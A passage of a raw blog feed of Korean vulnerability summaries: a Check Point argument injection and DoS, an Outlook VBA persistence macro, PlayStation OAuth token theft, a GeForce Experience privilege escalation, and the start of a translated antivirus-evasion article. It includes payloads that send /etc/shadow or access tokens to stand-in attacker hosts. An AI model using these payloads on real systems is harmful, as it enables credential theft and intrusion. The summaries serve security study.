&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xD1B5;&#xD558;&#xC5EC; &#xBA54;&#xC77C;&#xC744; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. sendmail&#xC740; &#xD30C;&#xC77C; &#xC804;&#xC1A1; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0;&#xB9CC; &#xBA54;&#xC77C;&#xC744; &#xBCF4;&#xB0BC; &#xB54C; &#xB204;&#xAC00; &#xBCF4;&#xB0B4;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; &#xCD5C;&#xACE0; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xBBC0;&#xB85C; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC778;&#xC790;&#xB85C; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC744; &#xB118;&#xACA8;&#xC8FC;&#xBA74; &#xD574;&#xCEE4;&#xC758; &#xBA54;&#xC77C; &#xC11C;&#xBC84;&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xCEE4;&#xAC00; netcat &#xB4F1;&#xC744; &#xD1B5;&#xD574; &#xC11C;&#xBC84;&#xB97C; &#xC5F0; &#xD6C4; Configure the CA&#xC758; &#x201C;Management Tool mail server&#x201D;&#xC5D0; <code>&lt;hacker_ip&gt; -m /etc/shadow %0a%0a</code>&#xB97C; &#xC785;&#xB825;&#xD558;&#xBA74; &#xD574;&#xCEE4;&#xC758; &#xBA54;&#xC77C; &#xC11C;&#xBC84;&#xC5D0; <code>/etc/shadow</code> &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC774; &#xBA54;&#xC77C; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xB0A0;&#xC544;&#xC624;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>Denial of Service&#xC758; &#xACBD;&#xC6B0; &#xC785;&#xB825; &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; &#xC2E4;&#xD328;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC6D0;&#xACA9; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD615;&#xC2DD;&#xC73C;&#xB85C; POST request&#xB97C; &#xBCF4;&#xB0BC; &#xACBD;&#xC6B0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs pgsql">POST /file_init?_ HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-keyword">checkpoint</span>.host:<span class="hljs-number">18265</span>Cookie: _Content-Length: <span class="hljs-number">1</span>q</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dos</tag>
      
      <tag>idioth</tag>
      
      <tag>argument injection</tag>
      
      <tag>checkpoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Outlook Mail based Persistence access</title>
    <link href="/2020/11/25/fabu1ous/2020-11-25/"/>
    <url>/2020/11/25/fabu1ous/2020-11-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 Outlook</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook&#xC740; Microsoft Office&#xC758; &#xC774;&#xBA54;&#xC77C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB85C; &#xC77C;&#xC815; &#xAD00;&#xB9AC;, &#xC5F0;&#xB77D;&#xCC98; &#xAD00;&#xB9AC;, &#xC77C;&#xC9C0; &#xB4F1;&#xC758; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; &#xB2E4;&#xB978; Office &#xC81C;&#xD488;&#xB4E4;&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; Outlook&#xC740; VBA(Visaul Basic for Application) &#xAE30;&#xBC18; &#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xACE0;, &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; persistence access&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Persistence access&#xB780; &#xD574;&#xCEE4;&#xAC00; victim&#xC5D0; initial access&#xB97C; &#xD68D;&#xB4DD;&#xD55C; &#xC774;&#xD6C4;&#xC5D0;&#xB3C4; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; access &#xD560; &#xC218; &#xC788;&#xB294; &#xC0C1;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. &#xD2B9;&#xC815; &#xC81C;&#xBAA9;&#xC758; &#xC774;&#xBA54;&#xC77C;&#xC774; &#xB3C4;&#xCC29;&#xD558;&#xBA74; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xB294; &#xC545;&#xC131; &#xB9E4;&#xD06C;&#xB85C;&#xB97C; victim&#xC5D0; &#xC2EC;&#xC5B4;&#xB193;&#xC73C;&#xBA74; &#xD574;&#xCEE4;&#xB294; &#xB2E8;&#xC21C;&#xD788; &#xC774;&#xBA54;&#xC77C;&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xAC83;&#xB9CC;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><div class="caption"><span>basic</span></div><code class="hljs visual">Option ExplicitPrivate WithEvents olInboxItems As ItemsPrivate Sub Application_Startup()    Set olInboxItems = Session.GetDefaultFolder(olFolderInbox).ItemsEnd SubPrivate Sub olInboxItems_ItemAdd(ByVal Item As Object)    On Error Resume Next    Dim olMailItem As MailItem    If TypeOf Item Is MailItem Then       If InStr(olMailItem.Subject, &quot;MDSec&quot;) &gt; 0 Then            MsgBox &quot;Hack The Planet&quot;            Shell &quot;calc.exe&quot;            olMailItem.Delete        End If    End If    Set Item = Nothing    Set olMailItem = NothingEnd Sub</code></pre><p>&#xC704; POC &#xCF54;&#xB4DC;&#xB294; calc.exe&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; VBA &#xB9E4;&#xD06C;&#xB85C;&#xC785;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; Outlook&#xC774; &#xC2E4;&#xD589;&#xB410;&#xC744; &#xB54C;&#xC758; &#xC218;&#xC2E0; &#xBA54;&#xC77C;&#xD568; &#xC0C1;&#xD0DC;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4;&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; &#xC774;&#xBA54;&#xC77C;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xBA74; &#xADF8; &#xC774;&#xBA54;&#xC77C;&#xC758; &#xC81C;&#xBAA9;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0;, &#xB9CC;&#xC57D; &#xADF8; &#xC81C;&#xBAA9;&#xC774; &#x201C;MDSec&#x201D;&#xC774;&#xB77C;&#xBA74; calc.exe&#xB97C; &#xC2E4;&#xD589;&#xD55C; &#xD6C4; &#xD574;&#xB2F9; &#xC774;&#xBA54;&#xC77C;&#xC744; &#xC0AD;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBA54;&#xC77C;&#xC758; &#xC81C;&#xBAA9;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xBC1C;&#xC2E0; &#xC8FC;&#xC18C; &#xD639;&#xC740; &#xB0B4;&#xC6A9; &#xB4F1;&#xC73C;&#xB85C; &#xB9E4;&#xD06C;&#xB85C;&#xC758; &#xD2B8;&#xB9AC;&#xAC70; &#xC870;&#xAC74;&#xC744; &#xB2E4;&#xC591;&#xD558;&#xAC8C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xACE0;, calc.exe &#xB300;&#xC2E0; &#xB9AC;&#xBC84;&#xC2A4; &#xC258;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xD574;&#xCEE4;&#xAC00; &#xC6D0;&#xACA9; &#xC81C;&#xC5B4;&#xB97C; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>outlook</tag>
      
      <tag>email</tag>
      
      <tag>persistence access</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Access token stealing in playstation</title>
    <link href="/2020/11/24/l0ch/2020-11-24/"/>
    <url>/2020/11/24/l0ch/2020-11-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/821896">Access token stealing in playstation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a href="https://my.playstation.com">https://my.playstation.com</a></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xCF58;&#xC194; &#xAC8C;&#xC784;&#xAE30;&#xAE30;&#xC778; PlayStation&#xC758; &#xCEE4;&#xBBA4;&#xB2C8;&#xD2F0; <a href="https://my.playstation.com/auth/response.html">https://my.playstation.com/auth/response.html</a> &#xC5D0;&#xC11C; &#xB85C;&#xADF8;&#xC778;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; Access Token&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com">https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com</a> &#xD398;&#xC774;&#xC9C0;&#xB294; &#xBC1C;&#xAE09; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB85C; OAuth &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xB294; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD638;&#xC2A4;&#xD305; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseResponse</span>(<span class="hljs-params">a</span>) </span>{    <span class="hljs-keyword">var</span> b = a.hash.substr(<span class="hljs-number">1</span>),        c = a.search.substr(<span class="hljs-number">1</span>),        d = b + <span class="hljs-string">&quot;&amp;&quot;</span> + c,        e = convertToObject(d);    <span class="hljs-keyword">return</span> e.refererURL = a.toString(), e}....<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResponseToApp</span>(<span class="hljs-params">a</span>) </span>{    <span class="hljs-keyword">var</span> b = extractFrameTypeFromRequestID(a.requestID),        c = a.targetOrigin || getOrigin(),        d = a.baseUrl || <span class="hljs-string">&quot;&quot;</span>,        e = a.returnRoute || <span class="hljs-string">&quot;&quot;</span>,        f = a.excludeQueryParams,        g = !f &amp;&amp; <span class="hljs-built_in">window</span>.location.search || <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">switch</span> (b) {...        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;window&quot;</span>:            <span class="hljs-built_in">window</span>.opener.postMessage(a, c);            <span class="hljs-keyword">break</span>;...    }}<span class="hljs-keyword">var</span> response = parseResponse(<span class="hljs-built_in">window</span>.location);sendResponseToApp(response);</code></pre><p>&#xD638;&#xC2A4;&#xD305;&#xB41C; &#xC704; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; &#xC544;&#xB798; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; access token&#xC744; &#xD574;&#xCEE4;&#xC758; &#xC11C;&#xBC84;&#xB85C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>request query&#xB97C; <code>parseResponse()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD30C;&#xC2F1; &#xD55C; &#xB4A4;  <code>sendResponseToApp()</code> &#xC758; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xD574; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li><li>query &#xC911; <code>reqeustID</code> &#xD544;&#xB4DC; &#xAC12;&#xC774; &#x201C;window&#x201D; &#xBA74; <code>window.opener.postMessage()</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>window.opener.postMessage()</code> &#xB294; &#xCCAB; &#xBC88;&#xC9F8; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xB450; &#xBC88;&#xC9F8; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xC778; &#xD2B9;&#xC815; &#xB3C4;&#xBA54;&#xC778;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; query&#xC640; <code>targetOrigin</code> &#xD544;&#xB4DC; &#xAC12;&#xC774; &#xC804;&#xB2EC;&#xB418;&#xBA74; <code>targetOrigin</code> &#xB3C4;&#xBA54;&#xC778;&#xC73C;&#xB85C; query&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB294; Access Token&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xCD5C;&#xC885; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com </span></code></pre><p>&#xC704; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; OAuth &#xBC1C;&#xAE09; &#xC11C;&#xBC84; request query&#xC758; <code>redirect_uri</code> &#xD544;&#xB4DC; &#xAC12;&#xC73C;&#xB85C; &#xBCF4;&#xB0B4;&#xBA74; Access Token&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;scope=capone:report_submission,kamaji:game_list,kamaji:get_account_hash,user:account.get,user:account.profile.get,kamaji:social_get_graph,kamaji:ugc:distributor,user:account.identityMapper,kamaji:music_views,kamaji:activity_feed_get_feed_privacy,kamaji:activity_feed_get_news_feed,kamaji:activity_feed_submit_feed_story,kamaji:activity_feed_internal_feed_submit_story,kamaji:account_link_token_web,kamaji:ugc:distributor_web,kamaji:url_preview&amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2&amp;redirect_uri=https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com/&amp;prompt=non</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javascript</tag>
      
      <tag>L0ch</tag>
      
      <tag>access token stealing</tag>
      
      <tag>playstation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-5990: NVIDIA GeForce Experience Local Privilege Escalation</title>
    <link href="/2020/11/23/idioth/2020-11-23/"/>
    <url>/2020/11/23/idioth/2020-11-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html">CVE-2020-17053: Use-After-Free IE Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NVIDIA GeForce Experience 3.20.5.70 &#xC774;&#xC804; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NVDIA GeForce Experience&#xC758; GeForce &#xADF8;&#xB798;&#xD53D;&#xCE74;&#xB4DC;&#xAC00; &#xC124;&#xCE58;&#xB41C; &#xC7A5;&#xBE44;&#xB85C; &#xC6D0;&#xACA9; &#xAC8C;&#xC784;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; GAMESTREAM &#xAE30;&#xB2A5;&#xC5D0;&#xC11C; Local Privilege Escalation &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>nvcontainer.exe &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; user impersonation &#xC5C6;&#xC774; <code>C:\\ProgramData\\NVIDIA Corporation\\ShadowPlay\\</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; <code>CaptureCore.log</code> &#xD30C;&#xC77C;&#xC744; &#xC4F0;&#xAC70;&#xB098; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC0C1;&#xC704; &#xD3F4;&#xB354; &#xC0C1;&#xC18D;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xACFC; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB294; &#xD3F4;&#xB354;&#xC5D0; &#xBAA8;&#xB4E0; &#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <code>CaptureCore.log</code> &#xD30C;&#xC77C;&#xC744; &#xC0AD;&#xC81C;&#xD55C; &#xD6C4; GAMESTREAM&#xC744; &#xC7AC;&#xC2DC;&#xC791;&#xD558;&#xBA74; <code>nvspapi64.dll</code>&#xC5D0;&#xC11C; &#xC18C;&#xD504;&#xD2B8; &#xB9C1;&#xD06C;&#xC640; &#xD558;&#xB4DC; &#xB9C1;&#xD06C;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xC5EC; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; &#xD30C;&#xC77C;&#xC744; &#xC0AD;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC791;&#xC5C5;&#xC740; <code>nvspapi64.dll</code>&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB418;&#xB294;&#xB370; &#xAC80;&#xC0AC;&#xB97C; &#xC9C4;&#xD589;&#xD55C; &#xD6C4; <code>CaptureCore.log</code>&#xC5D0; &#xB300;&#xD55C; &#xD578;&#xB4E4;&#xC744; &#xB2EB;&#xACE0; &#xCD5C;&#xC885; &#xACBD;&#xB85C;&#xB97C; &#xAC00;&#xC838;&#xC640; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB2E4;&#xC2DC; &#xD578;&#xB4E4;&#xC744; &#xC5FD;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/11/23/idioth/2020-11-23/image.png" alt></p><p>&#xC774;&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xD2B9;&#xC815; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; access event&#xB97C; catch &#xD558;&#xB294; <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">OpLock</a>&#xC744; CaptureCore.log&#xC5D0; &#xC124;&#xC815;&#xD55C; &#xD6C4; &#xAC80;&#xC0AC;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xBA74; OpLock&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xC5B4; C:\Windows\System32 &#xD3F4;&#xB354;&#xC5D0; arbitrary file creation&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>race condition</tag>
      
      <tag>toctou</tag>
      
      <tag>idioth</tag>
      
      <tag>geforce experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Engineering Antivirus evasion Part.1</title>
    <link href="/2020/11/22/idioth/av_evasion_part1/"/>
    <url>/2020/11/22/idioth/av_evasion_part1/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. &#xD558;&#xC9C0; &#xB9D0;&#xB77C;&#xB294; &#xAC83;&#xC740; &#xB354; &#xD558;&#xACE0; &#xC2F6;&#xC740; idioth&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC6D0;&#xB798; &#xC0AC;&#xB78C;&#xC740; &#xD558;&#xC9C0; &#xB9D0;&#xB77C;&#xBA74; &#xB354; &#xD558;&#xACE0; &#xC2F6;&#xC740; &#xBC95;. &#xADF8;&#xB798;&#xC11C; &#xD3C9;&#xC18C; &#xD0D0;&#xC9C0; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xAC83;&#xC5D0; &#xB300;&#xD574; &#xAD00;&#xC2EC;&#xC774; &#xB9CE;&#xC740;&#xB370; &#xAD00;&#xB828; &#xAE00;&#xC774; &#xC788;&#xAE38;&#xB798; &#xB4E4;&#xACE0; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/image.jpg" alt></p><p>&#xD3C9;&#xC18C;&#xC5D0;&#xB294; &#xADF8;&#xB0E5; &#xD63C;&#xC790; &#xACF5;&#xBD80;&#xD558;&#xACE0; &#xD63C;&#xC790; &#xBCF4;&#xB294;&#xAC70;&#xB77C; &#xC9C1;&#xB3C5;&#xC9C1;&#xD574; &#xD574;&#xB193;&#xACE0; &#xC2A4;&#xC2A4;&#xB85C; &#xBA38;&#xB9BF; &#xC18D;&#xC5D0;&#xC11C; &#xC815;&#xB9AC;&#xD558;&#xC600;&#xB294;&#xB370; &#xAE00;&#xB85C; &#xC801;&#xC73C;&#xB824;&#xB2C8; &#xACE0;&#xC0DD;&#xC744; &#xC880; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC601;&#xC5B4; &#xC2E4;&#xB825;&#xC774; &#xC88B;&#xC740; &#xAC83;&#xB3C4; &#xC544;&#xB2C8;&#xACE0; &#xBC88;&#xC5ED;&#xC744; &#xB9CE;&#xC774; &#xD574;&#xBCF8; &#xAC83;&#xB3C4; &#xC544;&#xB2C8;&#xB77C; &#xC758;&#xC5ED;&#xACFC; &#xC624;&#xC5ED;&#xC774; &#xB09C;&#xBB34;&#xD558;&#xB294; &#xAE00;&#xC774; &#xB420; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p><p>&#xBCF4;&#xC2DC;&#xB2E4;&#xAC00; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC65C; &#xC774;&#xB807;&#xAC8C; &#xBC88;&#xC5ED;&#xC774; &#xB410;&#xC9C0;? &#xD639;&#xC740; &#xB108;&#xBB34; &#xC774;&#xC0C1;&#xD55C;&#xB370;? &#xD558;&#xC2DC;&#xB294; &#xAC83; &#xC788;&#xC73C;&#xC2DC;&#xBA74; &#xB313;&#xAE00;&#xB85C; &#xB2EC;&#xC544;&#xB4DC;&#xB9AC;&#xBA74; &#xB208;&#xBB3C; &#xD758;&#xB9AC;&#xBA70; &#xC218;&#xC815;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><blockquote><p>&#xC6D0;&#xBB38; &#xAE00; : <a href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/">Engineering Antivirus evasion</a></p></blockquote><p><strong>tl;dr:</strong> &#xC774; &#xAC8C;&#xC2DC;&#xBB3C;&#xC740; &#xBAA8;&#xB4E0; AV/EDR&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC790;&#xB3D9;&#xC73C;&#xB85C; Meterpreter&#xC744; refactoring &#xD558;&#xB294; &#xAC83;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD55C;&#xB2E4;. &#xBAA8;&#xB4E0; &#xAE30;&#xC220;&#xC5D0; &#xB300;&#xD55C; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xC640; &#xBB38;&#xC790;&#xC5F4; &#xB09C;&#xB3C5;&#xD654; &#xD328;&#xC2A4;&#xC758; &#xAD6C;&#xD604;&#xC774; &#xC0C1;&#xC138;&#xD788; &#xC124;&#xBA85;&#xB418;&#xC5B4;&#xC788;&#xB2E4;. API import&#xB97C; &#xC228;&#xAE30;&#xB294; &#xAC83;&#xACFC; syscall &#xC7AC;&#xC791;&#xC131;&#xC5D0; &#xB300;&#xD55C; &#xC790;&#xC138;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; &#xAC8C;&#xC2DC;&#xAE00;&#xC774; &#xB108;&#xBB34; &#xAE38;&#xC5B4;&#xC9C0;&#xBBC0;&#xB85C; &#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD560; &#xAC83;&#xC774;&#xB2E4;. &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB294; <a href="https://github.com/scrt/avcleaner">github</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xAE30;&#xC5C5;&#xC774; &#xC815;&#xBCF4; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xBCF4;&#xD638;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xC640; EDR &#xAC19;&#xC740; &#xBCF4;&#xC548; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; &#xD544;&#xC218;&#xC801;&#xC774;&#xB2E4;. &#xACFC;&#xAC70;&#xC5D0;&#xB294; &#xBAA8;&#xB4E0; &#xBA40;&#xC6E8;&#xC5B4; &#xD0D0;&#xC9C0; &#xAE30;&#xC220;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xAE30;&#xAC00; &#xC26C;&#xC6E0;&#xC9C0;&#xB9CC; &#xD0D0;&#xC9C0; &#xAE30;&#xC220;&#xC774; &#xBC1C;&#xC804;&#xD568;&#xC5D0; &#xB530;&#xB77C; &#xC6B0;&#xD68C;&#xC5D0; &#xB354; &#xB9CE;&#xC740; &#xB178;&#xB825;&#xC774; &#xD544;&#xC694;&#xD558;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC99D;&#xBA85;&#xD558;&#xAE30; &#xC704;&#xD55C; Proof-of-Concept&#xAC00; &#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xC5D0; &#xC758;&#xD574; &#xCC28;&#xB2E8;&#xB41C; &#xACBD;&#xC6B0; &#xC704;&#xD5D8;&#xC131;&#xC5D0; &#xB300;&#xD574; &#xC774;&#xC57C;&#xAE30;&#xD558;&#xB294; &#xAC83;&#xC740; &#xB9E4;&#xC6B0; &#xC5B4;&#xB835;&#xB2E4;. 